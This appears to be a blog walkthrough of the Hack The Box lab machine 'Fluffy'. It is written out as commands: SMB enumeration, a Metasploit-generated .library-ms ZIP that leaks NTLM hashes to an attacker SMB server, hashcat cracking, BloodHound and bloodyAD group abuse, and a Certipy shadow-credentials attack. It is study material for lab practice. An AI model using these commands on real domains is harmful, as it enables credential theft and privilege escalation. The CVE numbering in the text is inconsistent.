---
title: "Fluffy"
date: 2025-08-10
categories: [HTB]
tags: [machine, ADCS, CVE,AD]
---
![Fluffy_LOGO](https://mrci0x1.gitbook.io/home/~gitbook/image?url=https%3A%2F%2F2226553737-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FGuulzzy1AvWrJMh0trBB%252Fuploads%252F2we71mC5teWddCF6fbQe%252Fimage.png%3Falt%3Dmedia%26token%3Dc9425f88-ada6-4697-95cf-e75b70b4316d&width=400&dpr=3&quality=100&sign=f0c96453&sv=2)

- **OS:** Windows
- **Difficulty:** Easy
- **Machine:** Active
- **Released:** 24/05/2025

## Machine Information
As is common in real life Windows pentests, you will start the Fluffy box with credentials for the following account:  ```j.fleischman``` / ```J0elTHEM4n1990!```

## Nmap Scan
```shell
sudo nmap 10.10.11.69 -T4 -A -open -p-
```
```shell
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-21 04:05:16Z)
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-21T04:06:58+00:00; +6h59m59s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-21T04:06:56+00:00; +6h59m59s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
|_ssl-date: 2025-07-21T04:06:58+00:00; +6h59m59s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-21T04:06:56+00:00; +6h59m59s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
49710/tcp open  msrpc         Microsoft Windows RPC
49727/tcp open  msrpc         Microsoft Windows RPC
49750/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-07-21T04:06:17
|_  start_date: N/A
|_clock-skew: mean: 6h59m58s, deviation: 0s, median: 6h59m58s

TRACEROUTE (using port 53/tcp)
HOP RTT       ADDRESS
1   170.58 ms 10.10.16.1
2   170.95 ms 10.10.11.69
```
We get some important data about target:

## SMB

So i started by testing the SMB port using the initial credentials:
```shell
nxc smb fluffy.htb -u 'j.fleischman' -p 'J0elTHEM4n1990!' --shares
```
Then we expanded and downloaded everything using:
```shell
nxc smb fluffy.htb  -u 'j.fleischman' -p 'J0elTHEM4n1990!' -M spider_plus -o DOWNLOAD_FLAG=True
```
![nxc_smb](https://mrci0x1.gitbook.io/home/~gitbook/image?url=https%3A%2F%2F2226553737-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FGuulzzy1AvWrJMh0trBB%252Fuploads%252FX7MnVPxXGOWE7TkFP55N%252FScreenshot%2520From%25202025-07-24%252005-09-46.png%3Falt%3Dmedia%26token%3D10b19759-4999-4bd5-a4f0-f8570a1683b6&width=400&dpr=3&quality=100&sign=2618b13f&sv=2)
Checked the downloaded SMB files and found a PDF called Upgrade_Notice.pdf looked suspicious from the IT department listing CVEs affecting the current Windows version. 
One of them, CVE-2025-24996 (NTLM File Path Spoofing), has a working PoC on GitHub.
![Upgrade_Notice.pdf](https://mrci0x1.gitbook.io/home/~gitbook/image?url=https%3A%2F%2F2226553737-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FGuulzzy1AvWrJMh0trBB%252Fuploads%252Fq0AnquA03OphFgIg80bn%252Fimage.png%3Falt%3Dmedia%26token%3Dd062d06d-46a3-4c5c-be8f-6e49eb429c8e&width=400&dpr=3&quality=100&sign=13faa9f9&sv=2)

## CVE-2025-24996: NTLM Hash Leak via .library-ms File 
the link of POC: ```https://github.com/FOLKS-iwd/CVE-2025-24071-msfvenom```

![CVE-2025-24071](https://mrci0x1.gitbook.io/home/~gitbook/image?url=https%3A%2F%2F2226553737-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FGuulzzy1AvWrJMh0trBB%252Fuploads%252FIgOwImNjv6GsZiXfzsUm%252Fimage.png%3Falt%3Dmedia%26token%3Db1be3b27-934f-4639-8342-cc405d6f9c2b&width=400&dpr=3&quality=100&sign=482ceac1&sv=2)

Let’s start exploiting it.

After following the steps in the PoC:
- Loaded the Metasploit module
- Set the attacker IP, filename, library name, and SMB share
- Ran the module and generated the malicious ZIP file ```(exploit.zip)```

Once the victim extracts the ZIP, Windows Explorer automatically processes the embedded ```.library-ms``` file. This triggers a connection attempt to the attacker's SMB server, resulting in NTLMv2 hash leakage.

You should see an output similar to the following:
![exploit](https://mrci0x1.gitbook.io/home/~gitbook/image?url=https%3A%2F%2F2226553737-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FGuulzzy1AvWrJMh0trBB%252Fuploads%252F9PJS7vnaCDkjdUxNUFbX%252FScreenshot%2520From%25202025-07-21%252004-06-39.png%3Falt%3Dmedia%26token%3D3b0c5fc8-8efe-4144-a186-10f94fd7b702&width=768&dpr=4&quality=100&sign=8ad495af&sv=2)
This hash can now be cracked offline using tools like hashcat or john to recover the user's cleartext password.

```shell
hashcat -m 5600 -a 0 ntlmv2.txt /home/kali/Downloads/rockyou.txt
```

![hashcat](https://mrci0x1.gitbook.io/home/~gitbook/image?url=https%3A%2F%2F2226553737-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FGuulzzy1AvWrJMh0trBB%252Fuploads%252FapeoNuGmbWdeIa26qjBJ%252FScreenshot%2520From%25202025-07-21%252004-22-19.png%3Falt%3Dmedia%26token%3D6ca0f956-32f3-483b-84dc-ee506bf573c3&width=400&dpr=3&quality=100&sign=98ac6e59&sv=2)

now you have credentials of user target ```P.AGILA:prometheusx-303```


## BloodHound

I used the credentials for  ```p.agila@fluffy.htb``` and analyzed them with BloodHound.

```shell
bloodhound-python -u 'p.agila' -p 'prometheusx-303' -d fluffy.htb -ns 10.10.11.69 -c All --zip
```
I found that this user is part of the ```SERVICE ACCOUNT MANAGERS group```, which has ```GenericAll``` privileges over the ```SERVICE ACCOUNTS group```. 
This means full control i can add or remove users, and modify settings for that group.
![BloodHound1](https://mrci0x1.gitbook.io/home/~gitbook/image?url=https%3A%2F%2F2226553737-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FGuulzzy1AvWrJMh0trBB%252Fuploads%252FQGwJrGqNuvim9ifURpEc%252FScreenshot%2520From%25202025-07-24%252006-43-18.png%3Falt%3Dmedia%26token%3Ddd2630e6-68c2-4f23-ad3d-c72100a91ba8&width=400&dpr=3&quality=100&sign=130f1eb3&sv=2)
let's see what we got, SERVICE ACCOUNTS contains key accounts such as:
- WINRM_SVC@FLUFFY.HTB
- LDAP_SVC@FLUFFY.HTB
- CA_SVC@FLUFFY.HTB
![BloodHound2](https://mrci0x1.gitbook.io/home/~gitbook/image?url=https%3A%2F%2F2226553737-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FGuulzzy1AvWrJMh0trBB%252Fuploads%252FfBcmqHW18XBDWYZk4bS4%252Fimage.png%3Falt%3Dmedia%26token%3Da2871440-54a6-4ee7-b090-f9d4c2a2b8e4&width=400&dpr=3&quality=100&sign=addd2495&sv=2)
If we see the user ```CA_SVC```, it's likely related to Certificate Services, and it may open a path to Active Directory Certificate Services (AD CS) exploitation.

This gives ```p.agila``` the ability to modify attributes of ```ca_svc```, a critical step for Shadow Credentials or Other attacks related to Certificate Services.
```shell
bloodyAD --host '10.10.11.69' -d 'dc01.fluffy.htb' -u 'p.agila' -p 'prometheusx-303'  add groupMember 'SERVICE ACCOUNTS' p.agila
```
By adding ```p.agila``` to SERVICE ACCOUNTS, I can potentially escalate privileges and gain further control through these service accounts.
![bloodyAD](https://mrci0x1.gitbook.io/home/~gitbook/image?url=https%3A%2F%2F2226553737-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FGuulzzy1AvWrJMh0trBB%252Fuploads%252FMfl0tQ7Cp461M9UjB3fL%252Fimage.png%3Falt%3Dmedia%26token%3D11314faf-8c66-4310-9a9d-0ea0b75080c9&width=400&dpr=3&quality=100&sign=96288301&sv=2)
Now we are ```p.agila``` added to ```SERVICE ACCOUNTS``` what next step???

After some research, I discovered that the attack path involves Active Directory Certificate Services (AD CS) exploitation am one pf this attacks called To better understand this technique, I referenced this detailed blog:

https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally

https://research.ifcr.dk/certipy-2-0-bloodhound-new-escalations-shadow-credentials-golden-certificates-and-more-34d1c26f0dc6

## Shadow Credentials → $User 

> **Notice:** The old tool certipy-ad is outdated, so I used the updated and maintained Certipy tool instead [Certipy] (https://github.com/ly4k/Certipy) don't mix between them

```shell
certipy shadow -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -account 'WINRM_SVC' auto
```
![Certipy](https://mrci0x1.gitbook.io/home/~gitbook/image?url=https%3A%2F%2F2226553737-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FGuulzzy1AvWrJMh0trBB%252Fuploads%252FpZSFWengHFPG9lJl0gBq%252Fimage.png%3Falt%3Dmedia%26token%3Dfdb6141b-4c81-477c-a741-1d1a2ae7b14b&width=400&dpr=3&quality=100&sign=b757e698&sv=2)

The ```KRB_AP_ERR_SKEW``` error occurs because your machine’s clock is out of sync with the Domain Controller ```10.10.11.69```, breaking Kerberos authentication for the Shadow Credentials attack. Fix it by syncing time with ```sudo ntpdate 10.10.11.69```

> **Notice:** Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)
It means your machine's clock is out of sync with the domain controller and Kerberos hates that.
Fix it with:

```shell
bashCopyEditsudo systemctl stop systemd-timesyncd
sudo ntpdate 10.10.11.69
This stops the system time service and manually syncs your clock with the DC (10.10.11.69), so you can get Kerberos tickets properly again.
```